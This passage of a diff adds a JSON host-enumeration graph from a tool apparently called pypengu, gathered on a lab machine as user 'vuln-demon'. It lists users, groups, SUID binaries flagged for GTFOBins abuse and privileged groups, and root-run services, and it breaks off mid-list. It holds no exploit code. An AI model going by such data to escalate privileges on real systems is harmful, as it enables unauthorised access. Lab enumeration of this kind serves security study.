@@ -1,0 +1,5196 @@
+{
+  "metadata": {
+    "hostname": "pengu_lab",
+    "os": "Ubuntu 20.04.2 LTS",
+    "kernel": "5.4.0-80-generic",
+    "arch": "amd64",
+    "collected_at": "2026-02-28T05:01:20Z",
+    "collector": "pypengu",
+    "collector_version": "1.0.0",
+    "collected_as": "vuln-demon",
+    "uid": "1001"
+  },
+  "nodes": [
+    {
+      "id": "user:root",
+      "type": "user",
+      "label": "root",
+      "properties": {
+        "gid": "0",
+        "home": "/root",
+        "is_current": false,
+        "is_root": true,
+        "shell": "/bin/bash",
+        "uid": "0"
+      }
+    },
+    {
+      "id": "user:daemon",
+      "type": "user",
+      "label": "daemon",
+      "properties": {
+        "gid": "1",
+        "home": "/usr/sbin",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "1"
+      }
+    },
+    {
+      "id": "user:bin",
+      "type": "user",
+      "label": "bin",
+      "properties": {
+        "gid": "2",
+        "home": "/bin",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "2"
+      }
+    },
+    {
+      "id": "user:sys",
+      "type": "user",
+      "label": "sys",
+      "properties": {
+        "gid": "3",
+        "home": "/dev",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "3"
+      }
+    },
+    {
+      "id": "user:sync",
+      "type": "user",
+      "label": "sync",
+      "properties": {
+        "gid": "65534",
+        "home": "/bin",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/bin/sync",
+        "uid": "4"
+      }
+    },
+    {
+      "id": "user:games",
+      "type": "user",
+      "label": "games",
+      "properties": {
+        "gid": "60",
+        "home": "/usr/games",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "5"
+      }
+    },
+    {
+      "id": "user:man",
+      "type": "user",
+      "label": "man",
+      "properties": {
+        "gid": "12",
+        "home": "/var/cache/man",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "6"
+      }
+    },
+    {
+      "id": "user:lp",
+      "type": "user",
+      "label": "lp",
+      "properties": {
+        "gid": "7",
+        "home": "/var/spool/lpd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "7"
+      }
+    },
+    {
+      "id": "user:mail",
+      "type": "user",
+      "label": "mail",
+      "properties": {
+        "gid": "8",
+        "home": "/var/mail",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "8"
+      }
+    },
+    {
+      "id": "user:news",
+      "type": "user",
+      "label": "news",
+      "properties": {
+        "gid": "9",
+        "home": "/var/spool/news",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "9"
+      }
+    },
+    {
+      "id": "user:uucp",
+      "type": "user",
+      "label": "uucp",
+      "properties": {
+        "gid": "10",
+        "home": "/var/spool/uucp",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "10"
+      }
+    },
+    {
+      "id": "user:proxy",
+      "type": "user",
+      "label": "proxy",
+      "properties": {
+        "gid": "13",
+        "home": "/bin",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "13"
+      }
+    },
+    {
+      "id": "user:www-data",
+      "type": "user",
+      "label": "www-data",
+      "properties": {
+        "gid": "33",
+        "home": "/var/www",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "33"
+      }
+    },
+    {
+      "id": "user:backup",
+      "type": "user",
+      "label": "backup",
+      "properties": {
+        "gid": "34",
+        "home": "/var/backups",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "34"
+      }
+    },
+    {
+      "id": "user:list",
+      "type": "user",
+      "label": "list",
+      "properties": {
+        "gid": "38",
+        "home": "/var/list",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "38"
+      }
+    },
+    {
+      "id": "user:irc",
+      "type": "user",
+      "label": "irc",
+      "properties": {
+        "gid": "39",
+        "home": "/var/run/ircd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "39"
+      }
+    },
+    {
+      "id": "user:gnats",
+      "type": "user",
+      "label": "gnats",
+      "properties": {
+        "gid": "41",
+        "home": "/var/lib/gnats",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "41"
+      }
+    },
+    {
+      "id": "user:nobody",
+      "type": "user",
+      "label": "nobody",
+      "properties": {
+        "gid": "65534",
+        "home": "/nonexistent",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "65534"
+      }
+    },
+    {
+      "id": "user:systemd-network",
+      "type": "user",
+      "label": "systemd-network",
+      "properties": {
+        "gid": "102",
+        "home": "/run/systemd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "100"
+      }
+    },
+    {
+      "id": "user:systemd-resolve",
+      "type": "user",
+      "label": "systemd-resolve",
+      "properties": {
+        "gid": "103",
+        "home": "/run/systemd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "101"
+      }
+    },
+    {
+      "id": "user:systemd-timesync",
+      "type": "user",
+      "label": "systemd-timesync",
+      "properties": {
+        "gid": "104",
+        "home": "/run/systemd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "102"
+      }
+    },
+    {
+      "id": "user:messagebus",
+      "type": "user",
+      "label": "messagebus",
+      "properties": {
+        "gid": "106",
+        "home": "/nonexistent",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "103"
+      }
+    },
+    {
+      "id": "user:syslog",
+      "type": "user",
+      "label": "syslog",
+      "properties": {
+        "gid": "110",
+        "home": "/home/syslog",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "104"
+      }
+    },
+    {
+      "id": "user:_apt",
+      "type": "user",
+      "label": "_apt",
+      "properties": {
+        "gid": "65534",
+        "home": "/nonexistent",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "105"
+      }
+    },
+    {
+      "id": "user:tss",
+      "type": "user",
+      "label": "tss",
+      "properties": {
+        "gid": "111",
+        "home": "/var/lib/tpm",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/bin/false",
+        "uid": "106"
+      }
+    },
+    {
+      "id": "user:uuidd",
+      "type": "user",
+      "label": "uuidd",
+      "properties": {
+        "gid": "112",
+        "home": "/run/uuidd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "107"
+      }
+    },
+    {
+      "id": "user:tcpdump",
+      "type": "user",
+      "label": "tcpdump",
+      "properties": {
+        "gid": "113",
+        "home": "/nonexistent",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "108"
+      }
+    },
+    {
+      "id": "user:landspengu_labe",
+      "type": "user",
+      "label": "landspengu_labe",
+      "properties": {
+        "gid": "115",
+        "home": "/var/lib/landspengu_labe",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "109"
+      }
+    },
+    {
+      "id": "user:pollinate",
+      "type": "user",
+      "label": "pollinate",
+      "properties": {
+        "gid": "1",
+        "home": "/var/cache/pollinate",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/bin/false",
+        "uid": "110"
+      }
+    },
+    {
+      "id": "user:sshd",
+      "type": "user",
+      "label": "sshd",
+      "properties": {
+        "gid": "65534",
+        "home": "/run/sshd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "111"
+      }
+    },
+    {
+      "id": "user:systemd-coredump",
+      "type": "user",
+      "label": "systemd-coredump",
+      "properties": {
+        "gid": "999",
+        "home": "/",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "999"
+      }
+    },
+    {
+      "id": "user:lxd",
+      "type": "user",
+      "label": "lxd",
+      "properties": {
+        "gid": "100",
+        "home": "/var/snap/lxd/common/lxd",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/bin/false",
+        "uid": "998"
+      }
+    },
+    {
+      "id": "user:vuln-demon",
+      "type": "user",
+      "label": "vuln-demon",
+      "properties": {
+        "gid": "1001",
+        "home": "/home/vuln-demon",
+        "is_current": true,
+        "is_root": false,
+        "shell": "/bin/bash",
+        "uid": "1001"
+      }
+    },
+    {
+      "id": "user:ftp",
+      "type": "user",
+      "label": "ftp",
+      "properties": {
+        "gid": "118",
+        "home": "/srv/ftp",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "112"
+      }
+    },
+    {
+      "id": "user:usbmux",
+      "type": "user",
+      "label": "usbmux",
+      "properties": {
+        "gid": "46",
+        "home": "/var/lib/usbmux",
+        "is_current": false,
+        "is_root": false,
+        "shell": "/usr/sbin/nologin",
+        "uid": "113"
+      }
+    },
+    {
+      "id": "group:root",
+      "type": "group",
+      "label": "root",
+      "properties": {
+        "gid": "0",
+        "is_privileged": true
+      }
+    },
+    {
+      "id": "group:daemon",
+      "type": "group",
+      "label": "daemon",
+      "properties": {
+        "gid": "1",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:bin",
+      "type": "group",
+      "label": "bin",
+      "properties": {
+        "gid": "2",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:sys",
+      "type": "group",
+      "label": "sys",
+      "properties": {
+        "gid": "3",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:adm",
+      "type": "group",
+      "label": "adm",
+      "properties": {
+        "gid": "4",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:tty",
+      "type": "group",
+      "label": "tty",
+      "properties": {
+        "gid": "5",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:disk",
+      "type": "group",
+      "label": "disk",
+      "properties": {
+        "gid": "6",
+        "is_privileged": true
+      }
+    },
+    {
+      "id": "group:lp",
+      "type": "group",
+      "label": "lp",
+      "properties": {
+        "gid": "7",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:mail",
+      "type": "group",
+      "label": "mail",
+      "properties": {
+        "gid": "8",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:news",
+      "type": "group",
+      "label": "news",
+      "properties": {
+        "gid": "9",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:uucp",
+      "type": "group",
+      "label": "uucp",
+      "properties": {
+        "gid": "10",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:man",
+      "type": "group",
+      "label": "man",
+      "properties": {
+        "gid": "12",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:proxy",
+      "type": "group",
+      "label": "proxy",
+      "properties": {
+        "gid": "13",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:kmem",
+      "type": "group",
+      "label": "kmem",
+      "properties": {
+        "gid": "15",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:dialout",
+      "type": "group",
+      "label": "dialout",
+      "properties": {
+        "gid": "20",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:fax",
+      "type": "group",
+      "label": "fax",
+      "properties": {
+        "gid": "21",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:voice",
+      "type": "group",
+      "label": "voice",
+      "properties": {
+        "gid": "22",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:cdrom",
+      "type": "group",
+      "label": "cdrom",
+      "properties": {
+        "gid": "24",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:floppy",
+      "type": "group",
+      "label": "floppy",
+      "properties": {
+        "gid": "25",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:tape",
+      "type": "group",
+      "label": "tape",
+      "properties": {
+        "gid": "26",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:sudo",
+      "type": "group",
+      "label": "sudo",
+      "properties": {
+        "gid": "27",
+        "is_privileged": true
+      }
+    },
+    {
+      "id": "group:audio",
+      "type": "group",
+      "label": "audio",
+      "properties": {
+        "gid": "29",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:dip",
+      "type": "group",
+      "label": "dip",
+      "properties": {
+        "gid": "30",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:www-data",
+      "type": "group",
+      "label": "www-data",
+      "properties": {
+        "gid": "33",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:backup",
+      "type": "group",
+      "label": "backup",
+      "properties": {
+        "gid": "34",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:operator",
+      "type": "group",
+      "label": "operator",
+      "properties": {
+        "gid": "37",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:list",
+      "type": "group",
+      "label": "list",
+      "properties": {
+        "gid": "38",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:irc",
+      "type": "group",
+      "label": "irc",
+      "properties": {
+        "gid": "39",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:src",
+      "type": "group",
+      "label": "src",
+      "properties": {
+        "gid": "40",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:gnats",
+      "type": "group",
+      "label": "gnats",
+      "properties": {
+        "gid": "41",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:shadow",
+      "type": "group",
+      "label": "shadow",
+      "properties": {
+        "gid": "42",
+        "is_privileged": true
+      }
+    },
+    {
+      "id": "group:utmp",
+      "type": "group",
+      "label": "utmp",
+      "properties": {
+        "gid": "43",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:video",
+      "type": "group",
+      "label": "video",
+      "properties": {
+        "gid": "44",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:sasl",
+      "type": "group",
+      "label": "sasl",
+      "properties": {
+        "gid": "45",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:plugdev",
+      "type": "group",
+      "label": "plugdev",
+      "properties": {
+        "gid": "46",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:staff",
+      "type": "group",
+      "label": "staff",
+      "properties": {
+        "gid": "50",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:games",
+      "type": "group",
+      "label": "games",
+      "properties": {
+        "gid": "60",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:users",
+      "type": "group",
+      "label": "users",
+      "properties": {
+        "gid": "100",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:nogroup",
+      "type": "group",
+      "label": "nogroup",
+      "properties": {
+        "gid": "65534",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:systemd-journal",
+      "type": "group",
+      "label": "systemd-journal",
+      "properties": {
+        "gid": "101",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:systemd-network",
+      "type": "group",
+      "label": "systemd-network",
+      "properties": {
+        "gid": "102",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:systemd-resolve",
+      "type": "group",
+      "label": "systemd-resolve",
+      "properties": {
+        "gid": "103",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:systemd-timesync",
+      "type": "group",
+      "label": "systemd-timesync",
+      "properties": {
+        "gid": "104",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:crontab",
+      "type": "group",
+      "label": "crontab",
+      "properties": {
+        "gid": "105",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:messagebus",
+      "type": "group",
+      "label": "messagebus",
+      "properties": {
+        "gid": "106",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:input",
+      "type": "group",
+      "label": "input",
+      "properties": {
+        "gid": "107",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:kvm",
+      "type": "group",
+      "label": "kvm",
+      "properties": {
+        "gid": "108",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:render",
+      "type": "group",
+      "label": "render",
+      "properties": {
+        "gid": "109",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:syslog",
+      "type": "group",
+      "label": "syslog",
+      "properties": {
+        "gid": "110",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:tss",
+      "type": "group",
+      "label": "tss",
+      "properties": {
+        "gid": "111",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:uuidd",
+      "type": "group",
+      "label": "uuidd",
+      "properties": {
+        "gid": "112",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:tcpdump",
+      "type": "group",
+      "label": "tcpdump",
+      "properties": {
+        "gid": "113",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:ssh",
+      "type": "group",
+      "label": "ssh",
+      "properties": {
+        "gid": "114",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:landspengu_labe",
+      "type": "group",
+      "label": "landspengu_labe",
+      "properties": {
+        "gid": "115",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:lxd",
+      "type": "group",
+      "label": "lxd",
+      "properties": {
+        "gid": "116",
+        "is_privileged": true
+      }
+    },
+    {
+      "id": "group:systemd-coredump",
+      "type": "group",
+      "label": "systemd-coredump",
+      "properties": {
+        "gid": "999",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:vuln-demon",
+      "type": "group",
+      "label": "vuln-demon",
+      "properties": {
+        "gid": "1001",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:ssl-cert",
+      "type": "group",
+      "label": "ssl-cert",
+      "properties": {
+        "gid": "117",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:ftp",
+      "type": "group",
+      "label": "ftp",
+      "properties": {
+        "gid": "118",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "group:netdev",
+      "type": "group",
+      "label": "netdev",
+      "properties": {
+        "gid": "119",
+        "is_privileged": false
+      }
+    },
+    {
+      "id": "binary:/usr/bin/at",
+      "type": "binary",
+      "label": "/usr/bin/at",
+      "properties": {
+        "gtfobin": false,
+        "owner": "other",
+        "path": "/usr/bin/at",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/bsd-write",
+      "type": "binary",
+      "label": "/usr/bin/bsd-write",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/bsd-write",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/chage",
+      "type": "binary",
+      "label": "/usr/bin/chage",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/chage",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/chfn",
+      "type": "binary",
+      "label": "/usr/bin/chfn",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/chfn",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/chsh",
+      "type": "binary",
+      "label": "/usr/bin/chsh",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/chsh",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/crontab",
+      "type": "binary",
+      "label": "/usr/bin/crontab",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/crontab",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/expiry",
+      "type": "binary",
+      "label": "/usr/bin/expiry",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/expiry",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/fusermount",
+      "type": "binary",
+      "label": "/usr/bin/fusermount",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/fusermount",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/gpasswd",
+      "type": "binary",
+      "label": "/usr/bin/gpasswd",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/gpasswd",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/mount",
+      "type": "binary",
+      "label": "/usr/bin/mount",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/mount",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/newgrp",
+      "type": "binary",
+      "label": "/usr/bin/newgrp",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/newgrp",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/passwd",
+      "type": "binary",
+      "label": "/usr/bin/passwd",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/passwd",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/pkexec",
+      "type": "binary",
+      "label": "/usr/bin/pkexec",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/pkexec",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/ssh-agent",
+      "type": "binary",
+      "label": "/usr/bin/ssh-agent",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/ssh-agent",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/su",
+      "type": "binary",
+      "label": "/usr/bin/su",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/su",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/sudo",
+      "type": "binary",
+      "label": "/usr/bin/sudo",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/sudo",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/umount",
+      "type": "binary",
+      "label": "/usr/bin/umount",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/umount",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/bin/wall",
+      "type": "binary",
+      "label": "/usr/bin/wall",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/bin/wall",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/sbin/pam_extrausers_chkpwd",
+      "type": "binary",
+      "label": "am_extrausers_chkpwd",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/sbin/pam_extrausers_chkpwd",
+        "suid": true
+      }
+    },
+    {
+      "id": "binary:/usr/sbin/unix_chkpwd",
+      "type": "binary",
+      "label": "usr/sbin/unix_chkpwd",
+      "properties": {
+        "gtfobin": false,
+        "owner": "root",
+        "path": "/usr/sbin/unix_chkpwd",
+        "suid": true
+      }
+    },
+    {
+      "id": "service:snapd.seeded.service",
+      "type": "service",
+      "label": "snapd.seeded.service",
+      "properties": {
+        "path": "/etc/systemd/system/cloud-final.service.wants/snapd.seeded.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.resolve1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.resolve1.service",
+      "properties": {
+        "path": "/etc/systemd/system/dbus-org.freedesktop.resolve1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.thermald.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.thermald.service",
+      "properties": {
+        "path": "/etc/systemd/system/dbus-org.freedesktop.thermald.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dbus-org.freedesktop.timesync1.service",
+      "type": "service",
+      "label": "dbus-org.freedesktop.timesync1.service",
+      "properties": {
+        "path": "/etc/systemd/system/dbus-org.freedesktop.timesync1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:e2scrub_reap.service",
+      "type": "service",
+      "label": "e2scrub_reap.service",
+      "properties": {
+        "path": "/etc/systemd/system/default.target.wants/e2scrub_reap.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:grub-initrd-fallback.service",
+      "type": "service",
+      "label": "grub-initrd-fallback.service",
+      "properties": {
+        "path": "/etc/systemd/system/emergency.target.wants/grub-initrd-fallback.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.system-shutdown.service",
+      "type": "service",
+      "label": "snapd.system-shutdown.service",
+      "properties": {
+        "path": "/etc/systemd/system/final.target.wants/snapd.system-shutdown.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:getty@tty1.service",
+      "type": "service",
+      "label": "getty@tty1.service",
+      "properties": {
+        "path": "/etc/systemd/system/getty.target.wants/getty@tty1.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:accounts-daemon.service",
+      "type": "service",
+      "label": "accounts-daemon.service",
+      "properties": {
+        "path": "/etc/systemd/system/graphical.target.wants/accounts-daemon.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:iscsi.service",
+      "type": "service",
+      "label": "iscsi.service",
+      "properties": {
+        "path": "/etc/systemd/system/iscsi.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:analyzer.service",
+      "type": "service",
+      "label": "analyzer.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/analyzer.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:atd.service",
+      "type": "service",
+      "label": "atd.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/atd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:console-setup.service",
+      "type": "service",
+      "label": "console-setup.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/console-setup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:cron.service",
+      "type": "service",
+      "label": "cron.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/cron.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:dmesg.service",
+      "type": "service",
+      "label": "dmesg.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/dmesg.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:grub-initrd-fallback.service",
+      "type": "service",
+      "label": "grub-initrd-fallback.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/grub-initrd-fallback.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:irqbalance.service",
+      "type": "service",
+      "label": "irqbalance.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/irqbalance.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:lxd-agent-9p.service",
+      "type": "service",
+      "label": "lxd-agent-9p.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/lxd-agent-9p.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:lxd-agent.service",
+      "type": "service",
+      "label": "lxd-agent.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/lxd-agent.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:networkd-dispatcher.service",
+      "type": "service",
+      "label": "networkd-dispatcher.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/networkd-dispatcher.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:networking.service",
+      "type": "service",
+      "label": "networking.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/networking.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:ondemand.service",
+      "type": "service",
+      "label": "ondemand.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/ondemand.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:open-vm-tools.service",
+      "type": "service",
+      "label": "open-vm-tools.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/open-vm-tools.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:pollinate.service",
+      "type": "service",
+      "label": "pollinate.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/pollinate.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:rsync.service",
+      "type": "service",
+      "label": "rsync.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/rsync.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:rsyslog.service",
+      "type": "service",
+      "label": "rsyslog.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/rsyslog.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:secureboot-db.service",
+      "type": "service",
+      "label": "secureboot-db.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/secureboot-db.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snap.lxd.activate.service",
+      "type": "service",
+      "label": "snap.lxd.activate.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snap.lxd.activate.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:snapd.apparmor.service",
+      "type": "service",
+      "label": "snapd.apparmor.service",
+      "properties": {
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.apparmor.service",
+        "run_as": "root",
